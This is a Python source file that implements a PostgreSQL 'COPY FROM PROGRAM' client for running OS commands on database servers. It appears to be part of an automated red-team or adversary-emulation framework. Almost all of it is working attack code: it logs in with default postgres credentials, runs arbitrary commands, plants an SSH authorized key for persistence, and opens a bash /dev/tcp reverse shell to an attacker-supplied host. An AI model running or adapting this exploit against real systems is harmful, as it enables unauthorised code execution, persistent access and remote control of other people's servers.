# Copyright 2026 Athena Contributors
#
# Use of this software is governed by the Business Source License 1.1
# included in the LICENSE file.
#
# Change Date: Four years from release date of each version
# Change License: Apache License, Version 2.0
#
# For commercial licensing, contact: azz093093.830330@gmail.com

"""SPEC-057: PostgreSQL COPY-TO-PROGRAM privilege escalation client.

Implements T1505.004 (Server Software Component: SQL Stored Procedures) via
PostgreSQL's COPY TO PROGRAM extension. When PostgreSQL runs as a privileged OS
user (typically 'postgres'), COPY TO PROGRAM executes arbitrary OS commands with
that user's privileges — providing code execution without an existing shell.

Attack flow:
  1. Connect with low-privilege or default PostgreSQL credentials.
  2. Issue COPY (SELECT ...) TO PROGRAM '<cmd>' to execute a command.
  3. Capture output via a staging table (COPY FROM PROGRAM trick) or
     out-of-band via a fact written by the command.
  4. Optionally install a reverse shell or add SSH authorized key for persistence.

Usage::

    client = PostgreSQLCopyClient("10.0.0.5", port=5432, user="postgres", password="")
    result = await client.execute_copy_program("id")
    # result.output contains stdout from `id`

References:
  - CVE-2019-9193 — PostgreSQL >= 9.3 COPY TO/FROM PROGRAM
  - SPEC-057 Athena PostgreSQL escalation path
"""

import asyncio
import logging
import uuid

from app.clients import BaseEngineClient, ExecutionResult

logger = logging.getLogger(__name__)

# Maximum bytes to read back from output staging table
_MAX_OUTPUT_BYTES = 4096

# Shell command to capture single-line output into a PostgreSQL table
_CAPTURE_TABLE = "_athena_out"
_SETUP_DDL = f"CREATE TEMP TABLE IF NOT EXISTS {_CAPTURE_TABLE} (line TEXT);"
_INSERT_VIA_COPY = f"COPY {_CAPTURE_TABLE} FROM PROGRAM '{{cmd}}';"
_SELECT_OUTPUT = f"SELECT string_agg(line, E'\\n') FROM {_CAPTURE_TABLE};"
_TRUNCATE_TABLE = f"TRUNCATE {_CAPTURE_TABLE};"


class PostgreSQLCopyClient(BaseEngineClient):
    """Execute OS commands via PostgreSQL COPY TO/FROM PROGRAM (SPEC-057).

    Requires psycopg2 (sync) wrapped in asyncio.to_thread for non-blocking use.
    The connection is opened per-execute call so the client is stateless and
    safe to share across concurrent OODA cycles.
    """

    def __init__(
        self,
        host: str,
        port: int = 5432,
        user: str = "postgres",
        password: str = "",
        database: str = "postgres",
        connect_timeout: int = 10,
    ) -> None:
        self.host = host
        self.port = port
        self.user = user
        self.password = password
        self.database = database
        self.connect_timeout = connect_timeout

    # ------------------------------------------------------------------
    # BaseEngineClient interface
    # ------------------------------------------------------------------

    async def execute(
        self,
        ability_id: str,
        target: str,
        params: dict | None = None,
        output_parser: str | None = None,
    ) -> ExecutionResult:
        """Execute a predefined ability against the PostgreSQL target.

        ability_id maps to a built-in command template:
          - "id"            : run `id` and return output (capability check)
          - "whoami"        : run `whoami`
          - "add_ssh_key"   : append params["pubkey"] to ~/.ssh/authorized_keys
          - "reverse_shell" : connect back to params["lhost"]:params["lport"]
          - "cmd"           : run arbitrary params["command"] (use with care)
        """
        params = params or {}
        execution_id = str(uuid.uuid4())

        cmd_map: dict[str, str] = {
            "id": "id",
            "whoami": "whoami",
            "uname": "uname -a",
            "add_ssh_key": (
                f"mkdir -p ~/.ssh && echo '{params.get('pubkey', '')}' "
                ">> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
            ),
            "reverse_shell": (
                f"bash -c 'bash -i >& /dev/tcp/{params.get('lhost', '127.0.0.1')}/"
                f"{params.get('lport', 4444)} 0>&1' &"
            ),
            "cmd": params.get("command", "id"),
        }

        command = cmd_map.get(ability_id)
        if command is None:
            return ExecutionResult(
                success=False,
                execution_id=execution_id,
                error=f"Unknown ability_id: {ability_id}",
            )

        return await self.execute_copy_program(command, execution_id=execution_id)

    async def get_status(self, execution_id: str) -> str:
        return "completed"

    async def list_abilities(self) -> list[dict]:
        return [
            {"id": "id", "name": "id — OS user check", "tactic": "TA0004"},
            {"id": "whoami", "name": "whoami", "tactic": "TA0004"},
            {"id": "uname", "name": "uname -a — system info", "tactic": "TA0007"},
            {"id": "add_ssh_key", "name": "Add SSH authorized key (persistence)", "tactic": "TA0003"},
            {"id": "reverse_shell", "name": "Reverse shell via bash TCP", "tactic": "TA0002"},
            {"id": "cmd", "name": "Arbitrary command (params.command)", "tactic": "TA0002"},
        ]

    async def is_available(self) -> bool:
        try:
            result = await self.execute_copy_program("echo ok")
            return result.success and (result.output or "").strip() == "ok"
        except Exception:
            return False

    # ------------------------------------------------------------------
    # Core COPY FROM PROGRAM execution
    # ------------------------------------------------------------------

    async def execute_copy_program(
        self,
        command: str,
        execution_id: str | None = None,
    ) -> ExecutionResult:
        """Run an OS command via PostgreSQL COPY FROM PROGRAM and capture stdout.

        Args:
            command: Shell command to execute (single-line; stdout captured).
            execution_id: Optional correlation ID; generated if not provided.

        Returns:
            ExecutionResult with output set to command stdout (up to 4096 bytes).
        """
        eid = execution_id or str(uuid.uuid4())

        try:
            output = await asyncio.to_thread(self._blocking_execute, command)
            facts = self._parse_facts(command, output)
            return ExecutionResult(
                success=True,
                execution_id=eid,
                output=output,
                facts=facts,
            )
        except Exception as exc:
            logger.warning("pgsql_client COPY FROM PROGRAM failed: %s", exc)
            return ExecutionResult(
                success=False,
                execution_id=eid,
                error=str(exc),
            )

    # ------------------------------------------------------------------
    # Blocking helper (runs in thread via asyncio.to_thread)
    # ------------------------------------------------------------------

    def _blocking_execute(self, command: str) -> str:
        """Synchronous psycopg2 execution — called via asyncio.to_thread."""
        try:
            import psycopg2  # type: ignore[import]
        except ImportError as exc:
            raise RuntimeError(
                "psycopg2 is not installed. "
                "Add psycopg2-binary to backend/requirements.txt."
            ) from exc

        conn = psycopg2.connect(
            host=self.host,
            port=self.port,
            user=self.user,
            password=self.password,
            dbname=self.database,
            connect_timeout=self.connect_timeout,
        )
        try:
            with conn:
                with conn.cursor() as cur:
                    cur.execute(_SETUP_DDL)
                    cur.execute(_TRUNCATE_TABLE)
                    # Escape single quotes in command for safe embedding
                    safe_cmd = command.replace("'", "'\\''")
                    cur.execute(_INSERT_VIA_COPY.format(cmd=safe_cmd))
                    cur.execute(_SELECT_OUTPUT)
                    row = cur.fetchone()
                    output = (row[0] or "") if row else ""
                    return output[:_MAX_OUTPUT_BYTES]
        finally:
            conn.close()

    # ------------------------------------------------------------------
    # Fact extraction from command output
    # ------------------------------------------------------------------

    def _parse_facts(self, command: str, output: str) -> list[dict]:
        """Extract structured facts from command output for OODA fact store."""
        facts: list[dict] = []
        output = (output or "").strip()

        if not output:
            return facts

        if command in ("id", "whoami") or command.startswith("id "):
            facts.append({
                "category": "credential",
                "trait": "credential.pgsql_rce_user",
                "value": output[:200],
            })
        elif "uname" in command:
            facts.append({
                "category": "host",
                "trait": "host.os",
                "value": output[:200],
            })
        elif "authorized_keys" in command:
            facts.append({
                "category": "host",
                "trait": "host.persistence",
                "value": f"SSH authorized key added via pgsql COPY-TO-PROGRAM on {self.host}",
            })

        return facts
